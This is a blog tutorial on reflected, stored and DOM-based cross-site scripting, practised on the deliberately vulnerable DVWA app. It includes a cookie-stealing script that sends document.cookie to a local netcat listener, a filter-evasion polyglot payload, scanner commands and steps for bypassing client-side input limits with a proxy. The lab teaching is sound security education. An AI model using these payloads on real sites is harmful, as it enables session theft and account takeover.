---
layout: post
title: Cross-Site Scripting (XSS)
date: 2024-11-13 22:49 +0530
author: "Gaurav Kumar"
tags: "browser theory security"
categories: "clean_code"
---

Type of injection attack where malicious scripts are injected in trusted websites, and executed by the visitor's browser.

Let us see a sample to understand a XSS security issue:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Simple XSS Demo</title>
  </head>
  <body>
    <h1>Simple XSS Example</h1>
    <form method="GET" action="">
      <label for="name">Enter your name:</label>
      <input type="text" id="name" name="name" />
      <button type="submit">Submit</button>
    </form>

    <p>
      Hello,
      <span id="output">
        <!-- This is where the vulnerability lies -->
        <?php echo $_GET['name']; ?> </span
      >!
    </p>
  </body>
</html>
```

This code is vulnerable to Cross-Site Scripting (XSS) because it directly inserts user input into the page without checking or cleaning it. When a user submits their name via the form, the name is shown on the page using PHP like this:

```php
<?php echo $_GET['name']; ?>
```

If a user enters a malicious script (For example: `<script>alert('XSS');</script>`), it will be executed in the browser. This could allow attackers to steal cookies, redirect users, or perform other harmful actions.

A good way to practically learn about these attacks, we can make use of the following "insecure" containerized apps:

[DAMN VULNERABLE WEB APPLICATION (DVWA)](https://github.com/digininja/DVWA?tab=readme-ov-file#damn-vulnerable-web-application)

`docker run --rm -it -p 80:80 --name vulnerable vulnerables/web-dvwa`

[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

`docker run --rm -p 3000:3000 --name juice-shop bkimminich/juice-shop`

## REFLECTED XSS

This scenario is similar to the previous example, where an attacker can inject and execute JavaScript in a user's browser, taking advantage of client-side vulnerabilities.

For example, a hacker could create a malicious shortened URL like [http://somewebsite/xss_r/?name=%3Cscript%3Ealert%28%22XSS%21%21%21%22%29%3C%2Fscript%3E#](http://somewebsite/xss_r/?name=%3Cscript%3Ealert%28%22XSS%21%21%21%22%29%3C%2Fscript%3E#). If a victim clicks on this link, it will execute the JavaScript on their machine. This can potentially allow the attacker to steal sensitive information, such as cookies, session data, or personal details, by exploiting the vulnerabilities in the user's browser.

![snapshot]({{ site.baseurl }}/assets/img/security/xss-reflected.png)

Here's a way through which a hacker can potentially steal your cookies which may contain sensitive information. To demonstrate it, I will run a test server using `nc`.

Command:
`nc -lvp 4444`  
Listens on port 4444 for incoming connections in verbose mode.

Using this payload, we can send the webpage's cookies to a server on 127.0.0.1:4444 by creating an image request with the document.cookie as a query string. The server will capture and log the cookies, which may include sensitive information like authentication tokens or session data.

```js
<script>
  new Image().src="http://127.0.0.1:4444?output="+document.cookie;
</script>
```

![snapshot]({{ site.baseurl }}/assets/img/security/xss-reflected-cookie.png)

> `TIP`: The following site has a "cheat-sheet" for OWASP payloads and strategies that can be used to test vulnerability: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot)

> `XSS Locator (Polyglot)`
> This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:
> javascript:/_--></title></style></textarea></script></xmp>
> <svg/onload='+/"`/+/onmouseover=1/+/[_/[]/+alert(42);//'>

There are certain tools which can help in detecting such vulnerabilities, such as: [XSStrike](https://github.com/s0md3v/XSStrike) and [XSSer](https://github.com/epsylon/xsser).

### USING XSSTRIKE

- Clone the repo and run `python xsstrike.py`
- Get the PHPSESSIONID Cookie value (We can use `document.cookie` method) for the website
- From the terminal, run the following command after updating it with your header values:

```bash
python xsstrike.py -u http://localhost/vulnerabilities/xss_r/?name=query --headers "Cookie: security=high; PHPSESSID=xxxxxxxxxxxxxx" --skip-dom
```

![snapshot]({{ site.baseurl }}/assets/img/security/xss-reflected-xsstrike.png)

### USING XSSER

- Clone the repo
- Install using: `sudo python ./setup.py install`
- Test

We can use the following command for testing for XSS vulnerabilities:

`xsser -u 'http://127.0.0.1' -g '/vulnerabilities/xss_r/?name=XSS' --cookie='security=high; PHPSESSID=tk1os5mdrfe3b3obj6jde7opu5' --ignore-proxy --threads 2 --auto`

> The query parameter should have XSS value other you would get an error like: At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):

- A report will be generated in the file `XSSreport.raw`

Here's an example of what the report would contain:

```bash
===========================================================================

[+] Target: http://127.0.0.1 | /vulnerabilities/xss_r/?name=XSS
[+] Vector: [ name ]

[!] Method: URL
[*] Hash: d35938008e2c6bd97f2e3e1fd88f601f

[*] Payload:

 http://127.0.0.1/vulnerabilities/xss_r/?name=%3Cform%3E%3Cbutton+formaction%3Djavascript%26colon%3Bd35938008e2c6bd97f2e3e1fd88f601f%3EY

[!] Vulnerable: [Not Info]

[!] Status: XSS FOUND!

===========================================================================
```

## STORED XSS

In Stored XSS, malicious input is saved on the server and executed whenever a user visits the affected page. For example, on a site like YouTube, a hacker could post a JavaScript payload as a comment. When other users view the page, the script executes, potentially stealing credentials or performing malicious actions. Unlike Reflected XSS, where the script is part of a crafted link, Stored XSS persists on the server and impacts multiple users over time.

Here's a GitHub page which contains certain useful XSS Payload which can be ucsed for testing: [Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads?tab=readme-ov-file#tiny-xss-payloads).

Let's use the same DVWA application -> XSS (Stored) page to learn about this.

Using the PayLoad `<svg onload=alert(1)>` we can see that the site is vulnerable (when Security Level = low).

It contains a `Message` textarea which has a client side character input limit.

We will use a proxy called `Zed Attach Proxy`: [zaproxy](https://www.zaproxy.org/).

> ZAP is what is known as a “manipulator-in-the-middle proxy.” It stands between the tester’s browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination.

![snapshot]({{ site.baseurl }}/assets/img/security/zap.png)

### BYPASSING CLIENT-SIDE CHARACTER LIMITS WITH ZAP

Using ZAP, we can bypass client-side character limits. Follow these steps:

1. Open ZAP and choose `Manual Explore`

   - URL: `http://localhost`
   - Click on `Launch Browser`

2. A new browser instance will launch, and requests will be proxied through ZAP.

   - Navigate to the target site (e.g., DVWA at `http://localhost`).

3. Enable breakpoints in ZAP

   - Click on the green circular button in the menu bar to enable breakpoints for all requests.

4. Intercept and modify requests

   - Fill in the `Name` and `Message` fields on the site and send the request.

   ![snapshot]({{ site.baseurl }}/assets/img/security/zap-simple-message-1.png)

   ⚠️ The intercepted request in ZAP can now be modified before being sent to the server, allowing you to bypass any client-side restrictions imposed on character input.

5. You can modify the POST body by replacing it with: `txtName=test&mtxMessage=<IMG SRC=# onmouseover="alert('xss')">&btnSign=Sign+Guestbook` on zap. You can even go beyond the number of characters allowed to see if that goes through.

6. Click on continue to next break point. The request will go to the server, get processed and saved!

> A hacker could exploit this method to add a malicious HTML form that tricks users into entering their credentials. The user might believe they need to sign in to view comments, while the JavaScript silently sends the submitted data to an attacker-controlled server, exploiting the vulnerability.

### AUTOMATED XSS VULNERABILITY TEST USING ZAP

To automate XSS testing using OWASP ZAP, follow these steps:

- Launch the website in a browser via ZAP, so the request gets intercepted by ZAP.
- In ZAP, review the intercepted request and response.
- Identify the part of the request to fuzz, such as the `txtName` parameter.
- Right-click on the `txtName` field within the request and select `Fuzz` to begin the automated injection of XSS payloads.

![snapshot]({{ site.baseurl }}/assets/img/security/zap-fuzz.png)

- From there, click on `Payloads` -> `Add` -> `File Fuzzers` ->
  `jbrofuzz` -> Select `XSS.
- Confirm the selection and "start fuzzing".

![snapshot]({{ site.baseurl }}/assets/img/security/zap-fuzz-result.png)

- After fuzzing is complete, check the `State` column to identify any potential vulnerabilities. The payload used for each request will be highlighted above the corresponding entry.

## DOM-BASED XSS

The attack occurs on the client side (in the browser), where JavaScript code manipulates the DOM (Document Object Model). It doesn't rely on the server to reflect or process the input; instead, the client-side script directly handles the malicious input.

In the DVWA site, if we go to the page `XSS (DOM)` and inspect the HTML, we can see that it includes the following javascript:

This JavaScript code checks if the URL contains the query parameter default=. If it does, it extracts the value of this parameter, decodes it, and creates an `<option>` element with that value for a dropdown list. It then adds a separator option `(----)` and includes additional language options: English, French, Spanish, and German.

```js
if (document.location.href.indexOf("default=") >= 0) {
  var lang = document.location.href.substring(
    document.location.href.indexOf("default=") + 8
  );
  document.write(
    "<option value='" + lang + "'>" + decodeURI(lang) + "</option>"
  );
  document.write("<option value='' disabled='disabled'>----</option>");
}

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");
```

We can easily exploit this vulnerability by modifying the default query parameter in the URL, like so:

[http://127.0.0.1/vulnerabilities/xss_d/?default=Test](http://127.0.0.1/vulnerabilities/xss_d/?default=Test)

As a result, the Test language will appear in the drop-down list of available languages.

To automate DOM XSS vulnerability testing, we can use xsstrike, just like we did for reflective XSS.

> `TIP`: When looking for vulnerability, look out for `document.write` method in the source code.

---
